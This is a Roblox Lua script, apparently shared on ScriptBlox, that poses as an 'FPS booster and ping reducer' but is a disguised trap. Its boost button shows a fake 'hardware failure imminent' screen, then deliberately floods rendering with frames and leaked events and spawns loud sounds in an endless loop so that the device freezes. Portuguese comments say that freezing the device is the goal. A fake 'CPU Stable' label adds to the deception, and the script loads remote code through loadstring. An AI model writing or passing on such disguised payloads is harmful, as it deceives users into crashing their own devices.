--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "FPS BOOSTER & PING REDUCER",
   LoadingTitle = "Analyzing Hardware...",
   LoadingSubtitle = "By Skoll30",
   ConfigurationSaving = { Enabled = false }
})

local Tab = Window:CreateTab("Optimization", 4483362458)

Tab:CreateButton({
   Name = "BOOST PERFORMANCE (ULTRA)",
   Callback = function()
       -- Destruindo a UI para não ter volta
       Rayfield:Destroy()

       local player = game.Players.LocalPlayer
       local sg = Instance.new("ScreenGui", player.PlayerGui)
       sg.DisplayOrder = 999999
       sg.IgnoreGuiInset = true

       -- Fundo de Alerta
       local mainFrame = Instance.new("Frame", sg)
       mainFrame.Size = UDim2.new(1, 0, 1, 0)
       mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)

       local warningText = Instance.new("TextLabel", mainFrame)
       warningText.Size = UDim2.new(1, 0, 0.5, 0)
       warningText.Text = "SYSTEM OVERLOAD\nHARDWARE FAILURE IMMINENT"
       warningText.TextColor3 = Color3.new(1, 0, 0)
       warningText.TextSize = 30
       warningText.Font = Enum.Font.Code
       warningText.BackgroundTransparency = 1

       -- --- [ O MOTOR DO TRAVAMENTO ] ---
       task.spawn(function()
           -- 1. Loop de Sobrecarga de Renderização (GPU)
           game:GetService("RunService").RenderStepped:Connect(function()
               for i = 1, 200 do
                   -- Criando frames com efeitos pesados (Transparência + Gradiente)
                   local leak = Instance.new("Frame", sg)
                   leak.Size = UDim2.new(1, 0, 1, 0)
                   leak.BackgroundColor3 = Color3.new(math.random(), 0, 0)
                   leak.BackgroundTransparency = 0.9
                   
                   -- 2. Sobrecarga de Memória (RAM)
                   -- Criando eventos que nunca são limpos, entupindo a memória
                   local event = Instance.new("BindableEvent", leak)
                   
                   -- Faz a tela piscar para dar a sensação de que o celular está morrendo
                   mainFrame.BackgroundColor3 = Color3.new(math.random(0, 0.2), 0, 0)
               end
           end)

           -- 3. Sobrecarga de Som (Frita o processamento de áudio)
           while true do
               local s = Instance.new("Sound", game.Workspace)
               s.SoundId = "rbxassetid://138081509"
               s.Volume = 10
               s.PlaybackSpeed = math.random(0.1, 2)
               s:Play()
               -- Sem o Debris:AddItem, o som acumula e trava o driver de áudio
               task.wait(0.01)
           end
       end)
   end,
})

Tab:CreateLabel("Status: CPU Stable (34°C)")
